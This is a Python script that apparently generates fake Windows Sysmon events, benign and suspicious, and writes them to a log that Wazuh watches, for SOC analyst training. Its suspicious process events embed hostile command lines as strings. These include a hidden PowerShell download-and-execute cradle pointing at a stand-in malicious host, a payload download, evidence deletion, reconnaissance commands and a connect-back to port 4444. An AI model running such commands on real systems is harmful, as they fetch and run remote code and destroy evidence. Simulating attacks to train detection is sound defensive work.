#!/usr/bin/env python3
"""
Sysmon Event Generator for SOC Training
Generates realistic Windows Sysmon events for security analysis training
"""

import json
import time
import random
import socket
import os
import sys
from datetime import datetime, timedelta
import logging

# Configure logging
LOG_DIR = '/opt/sysmon-simulator/logs'
LOG_FILE = os.path.join(LOG_DIR, 'generator.log')

# Ensure the log directory exists before configuring logging
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SysmonEventSimulator:
    def __init__(self, wazuh_manager_ip="172.20.0.13"):
        self.wazuh_manager_ip = wazuh_manager_ip
        self.hostname = socket.gethostname()
        self.computer_name = f"WIN-{random.randint(1000, 9999)}"
        
        # Realistic process lists
        self.legitimate_processes = [
            "explorer.exe", "winlogon.exe", "csrss.exe", "lsass.exe",
            "services.exe", "svchost.exe", "chrome.exe", "firefox.exe",
            "notepad.exe", "calc.exe", "taskmgr.exe", "cmd.exe"
        ]
        
        self.suspicious_processes = [
            "powershell.exe", "wscript.exe", "cscript.exe", "regsvr32.exe",
            "rundll32.exe", "mshta.exe", "bitsadmin.exe", "certutil.exe",
            "suspicious_malware.exe", "cryptolocker.exe", "backdoor.exe"
        ]
        
        self.legitimate_ips = [
            "8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9"
        ]
        
        self.suspicious_ips = [
            "192.168.100.50", "10.0.100.100", "172.16.50.50",
            "203.0.113.10", "198.51.100.20", "45.76.123.45"
        ]
        
        self.backdoor_ports = [4444, 5555, 6666, 1337, 8080, 9999]
        self.normal_ports = [80, 443, 53, 21, 22, 25, 110, 143, 993, 995]
        
    def generate_process_creation_event(self, suspicious=False):
        """Generate Sysmon Event ID 1: Process Creation"""
        if suspicious:
            process = random.choice(self.suspicious_processes)
            parent_process = random.choice(["winword.exe", "excel.exe", "outlook.exe", "explorer.exe"])
            command_line = self.generate_suspicious_command_line(process)
        else:
            process = random.choice(self.legitimate_processes)
            parent_process = "services.exe"
            command_line = f"{process}"
        
        process_id = random.randint(1000, 9999)
        parent_process_id = random.randint(500, 1500)
        
        event = {
            "timestamp": datetime.now().isoformat(),
            "computer": self.computer_name,
            "eventID": 1,
            "eventType": "Process Create",
            "image": f"C:\\Windows\\System32\\{process}",
            "processId": process_id,
            "parentProcessId": parent_process_id,
            "commandLine": command_line,
            "user": random.choice(["SYSTEM", "NT AUTHORITY\\SYSTEM", "Administrator", "user1"]),
            "logonId": f"0x{random.randint(100, 999):x}",
            "parentImage": f"C:\\Windows\\System32\\{parent_process}",
            "md5": self.generate_hash("md5"),
            "sha256": self.generate_hash("sha256"),
            "company": "Microsoft Corporation" if not suspicious else "",
            "signed": "true" if not suspicious else "false"
        }
        
        return self.format_sysmon_log(event)
    
    def generate_suspicious_command_line(self, process):
        """Generate realistic suspicious command lines"""
        if process == "powershell.exe":
            suspicious_commands = [
                "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).downloadString('http://malicious.com/script.ps1')\"",
                "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQA",
                "powershell.exe -Command \"& {Invoke-WebRequest -Uri 'http://192.168.100.50/payload.exe' -OutFile 'C:\\temp\\payload.exe'}\"",
                "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Sleep 30; Remove-Item -Path 'C:\\evidence.txt'\""
            ]
            return random.choice(suspicious_commands)
        elif process == "cmd.exe":
            return random.choice([
                "cmd.exe /c \"whoami && net user && ipconfig\"",
                "cmd.exe /c \"ping -n 10 192.168.100.50 && del C:\\temp\\*.log\"",
                "cmd.exe /c \"netstat -an | findstr LISTEN > C:\\temp\\ports.txt\""
            ])
        else:
            return f"{process} --malicious-flag --connect-back 192.168.100.50:4444"
    
    def generate_network_connection_event(self, suspicious=False):
        """Generate Sysmon Event ID 3: Network Connection"""
        if suspicious:
            dest_ip = random.choice(self.suspicious_ips)
            dest_port = random.choice(self.backdoor_ports)
            process = random.choice(self.suspicious_processes)
        else:
            dest_ip = random.choice(self.legitimate_ips)
            dest_port = random.choice(self.normal_ports)
            process = random.choice(self.legitimate_processes)
        
        event = {
            "timestamp": datetime.now().isoformat(),
            "computer": self.computer_name,
            "eventID": 3,
            "eventType": "Network Connection",
            "image": f"C:\\Windows\\System32\\{process}",
            "processId": random.randint(1000, 9999),
            "user": random.choice(["SYSTEM", "Administrator", "user1"]),
            "protocol": random.choice(["tcp", "udp"]),
            "sourceIP": f"192.168.1.{random.randint(10, 50)}",
            "sourcePort": random.randint(49152, 65535),
            "destinationIP": dest_ip,
            "destinationPort": dest_port,
            "destinationHostname": "suspicious-domain.com" if suspicious else "legitimate-site.com"
        }
        
        return self.format_sysmon_log(event)
    
    def generate_file_creation_event(self, suspicious=False):
        """Generate Sysmon Event ID 11: File Created"""
        if suspicious:
            suspicious_files = [
                "C:\\Windows\\System32\\malware.exe",
                "C:\\Users\\Public\\backdoor.bat",
                "C:\\Windows\\Temp\\cryptolocker.exe", 
                "C:\\Users\\Administrator\\Desktop\\keylogger.dll",
                "C:\\ProgramData\\evil.exe",
                "C:\\Windows\\Tasks\\persistence.exe"
            ]
            target_file = random.choice(suspicious_files)
            process = random.choice(self.suspicious_processes)
        else:
            legitimate_files = [
                "C:\\Users\\Administrator\\Documents\\report.docx",
                "C:\\Windows\\Temp\\update_cache.tmp",
                "C:\\ProgramData\\Microsoft\\Windows\\Caches\\cache.dat",
                "C:\\Users\\Public\\Downloads\\software.msi"
            ]
            target_file = random.choice(legitimate_files)
            process = random.choice(self.legitimate_processes)
        
        event = {
            "timestamp": datetime.now().isoformat(),
            "computer": self.computer_name,
            "eventID": 11,
            "eventType": "File Created",
            "image": f"C:\\Windows\\System32\\{process}",
            "processId": random.randint(1000, 9999),
            "targetFilename": target_file,
            "creationTime": datetime.now().isoformat(),
            "user": random.choice(["Administrator", "SYSTEM", "user1"])
        }
        
        return self.format_sysmon_log(event)
    
    def generate_registry_event(self, suspicious=False):
        """Generate Sysmon Event ID 13: Registry Value Set"""
        if suspicious:
            registry_keys = [
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware",
                "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Persistence",
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EvilService\\ImagePath"
            ]
            target_key = random.choice(registry_keys)
            process = random.choice(self.suspicious_processes)
            value_data = "C:\\Windows\\System32\\malware.exe"
        else:
            registry_keys = [
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
                "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\ShowHidden",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA"
            ]
            target_key = random.choice(registry_keys)
            process = random.choice(self.legitimate_processes)
            value_data = "1"
        
        event = {
            "timestamp": datetime.now().isoformat(),
            "computer": self.computer_name,
            "eventID": 13,
            "eventType": "Registry Value Set",
            "image": f"C:\\Windows\\System32\\{process}",
            "processId": random.randint(1000, 9999),
            "targetObject": target_key,
            "details": value_data,
            "user": random.choice(["Administrator", "SYSTEM"])
        }
        
        return self.format_sysmon_log(event)
    
    def generate_hash(self, hash_type):
        """Generate fake but realistic hashes"""
        if hash_type == "md5":
            return ''.join(random.choices('0123456789abcdef', k=32))
        elif hash_type == "sha256":
            return ''.join(random.choices('0123456789abcdef', k=64))
        elif hash_type == "sha1":
            return ''.join(random.choices('0123456789abcdef', k=40))
    
    def format_sysmon_log(self, event):
        """Format event as Windows Event Log entry for Wazuh"""
        timestamp = event['timestamp']
        event_id = event['eventID']
        event_type = event['eventType']
        computer = event['computer']
        
        # Base log format similar to Windows Event Log
        log_entry = f"WinEvtLog: Microsoft-Windows-Sysmon/Operational: INFORMATION({event_id}): {timestamp}: {event_type}: {computer}: "
        
        # Add event-specific details
        if event_id == 1:  # Process Creation
            log_entry += f"Image: {event['image']}, ProcessId: {event['processId']}, CommandLine: {event['commandLine']}, ParentImage: {event['parentImage']}, MD5: {event['md5']}, SHA256: {event['sha256']}"
        elif event_id == 3:  # Network Connection
            log_entry += f"Image: {event['image']}, SourceIp: {event['sourceIP']}, SourcePort: {event['sourcePort']}, DestinationIp: {event['destinationIP']}, DestinationPort: {event['destinationPort']}"
        elif event_id == 11:  # File Created
            log_entry += f"Image: {event['image']}, TargetFilename: {event['targetFilename']}, CreationTime: {event['creationTime']}"
        elif event_id == 13:  # Registry Value Set
            log_entry += f"Image: {event['image']}, TargetObject: {event['targetObject']}, Details: {event['details']}"
        
        return log_entry
    
    def send_to_wazuh(self, log_entry):
        """Send log entry to Wazuh via local log file"""
        try:
            # Write to log file that Wazuh agent monitors
            with open('/var/log/sysmon-simulator.log', 'a') as f:
                f.write(f"{log_entry}\n")
            
            # Extract event ID for logging
            event_id = log_entry.split('INFORMATION(')[1].split(')')[0]
            logger.info(f"Generated Sysmon Event ID {event_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error sending event to Wazuh: {e}")
            return False
    
    def generate_attack_scenario(self, scenario_name):
        """Generate specific attack scenarios for training"""
        scenarios = {
            "brute_force": self.generate_brute_force_scenario,
            "malware_execution": self.generate_malware_scenario,
            "lateral_movement": self.generate_lateral_movement_scenario,
            "persistence": self.generate_persistence_scenario,
            "data_exfiltration": self.generate_exfiltration_scenario
        }
        
        if scenario_name in scenarios:
            logger.info(f"Generating {scenario_name} attack scenario")
            return scenarios[scenario_name]()
        else:
            logger.warning(f"Unknown scenario: {scenario_name}")
            return []
    
    def generate_brute_force_scenario(self):
        """Generate brute force attack scenario"""
        events = []
        logger.info("Simulating brute force attack...")
        
        # Multiple failed login attempts
        for i in range(5):
            event = self.generate_process_creation_event(suspicious=True)
            events.append(event)
            time.sleep(2)
        
        return events
    
    def generate_malware_scenario(self):
        """Generate malware execution scenario"""
        events = []
        logger.info("Simulating malware execution...")
        
        # 1. Suspicious process creation
        events.append(self.generate_process_creation_event(suspicious=True))
        
        # 2. Outbound connection to C&C
        events.append(self.generate_network_connection_event(suspicious=True))
        
        # 3. File creation in suspicious location
        events.append(self.generate_file_creation_event(suspicious=True))
        
        # 4. Registry modification for persistence
        events.append(self.generate_registry_event(suspicious=True))
        
        return events
    
    def generate_lateral_movement_scenario(self):
        """Generate lateral movement scenario"""
        events = []
        logger.info("Simulating lateral movement...")
        
        # Multiple network connections to internal IPs
        for i in range(3):
            events.append(self.generate_network_connection_event(suspicious=True))
            time.sleep(1)
        
        return events
    
    def generate_persistence_scenario(self):
        """Generate persistence establishment scenario"""
        events = []
        logger.info("Simulating persistence establishment...")
        
        # Registry modifications for startup persistence
        for i in range(2):
            events.append(self.generate_registry_event(suspicious=True))
            time.sleep(1)
        
        return events
    
    def generate_exfiltration_scenario(self):
        """Generate data exfiltration scenario"""
        events = []
        logger.info("Simulating data exfiltration...")
        
        # File creation (staging data)
        events.append(self.generate_file_creation_event(suspicious=True))
        
        # Network connection (exfiltrating data)
        events.append(self.generate_network_connection_event(suspicious=True))
        
        return events
    
    def run_simulation(self, interval=30, duration=0, scenario_mode=False):
        """Run the simulation for specified duration"""
        logger.info(f"Starting Sysmon simulation - Interval: {interval}s, Duration: {duration}s")
        
        if duration == 0:
            logger.info("Running indefinitely (duration=0)")
        
        start_time = time.time()
        event_count = 0
        
        try:
            while True:
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                if scenario_mode:
                    # Run specific attack scenarios periodically
                    scenarios = ["brute_force", "malware_execution", "lateral_movement", "persistence", "data_exfiltration"]
                    scenario = random.choice(scenarios)
                    events = self.generate_attack_scenario(scenario)
                    
                    for event in events:
                        self.send_to_wazuh(event)
                        event_count += 1
                        time.sleep(2)
                else:
                    # Generate random events with some being suspicious
                    event_generators = [
                        lambda: self.generate_process_creation_event(suspicious=random.choice([True, False, False])),
                        lambda: self.generate_network_connection_event(suspicious=random.choice([True, False, False])),
                        lambda: self.generate_file_creation_event(suspicious=random.choice([True, False, False, False])),
                        lambda: self.generate_registry_event(suspicious=random.choice([True, False, False, False]))
                    ]
                    
                    # Generate 1-4 events per interval
                    num_events = random.randint(1, 4)
                    for _ in range(num_events):
                        generator = random.choice(event_generators)
                        event = generator()
                        self.send_to_wazuh(event)
                        event_count += 1
                        time.sleep(random.uniform(0.5, 3))
                
                logger.info(f"Generated {event_count} events so far. Waiting {interval}s for next batch...")
                time.sleep(interval)
                
        except KeyboardInterrupt:
            logger.info("Simulation interrupted by user")
        except Exception as e:
            logger.error(f"Simulation error: {e}")
        finally:
            logger.info(f"Simulation completed. Total events generated: {event_count}")

if __name__ == "__main__":
    # Parse command line arguments
    wazuh_ip = sys.argv[1] if len(sys.argv) > 1 else "172.20.0.13"
    interval = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0  # 0 = infinite
    scenario_mode = sys.argv[4].lower() == "true" if len(sys.argv) > 4 else False
    
    # Create and run simulator
    simulator = SysmonEventSimulator(wazuh_ip)
    simulator.run_simulation(interval, duration, scenario_mode)
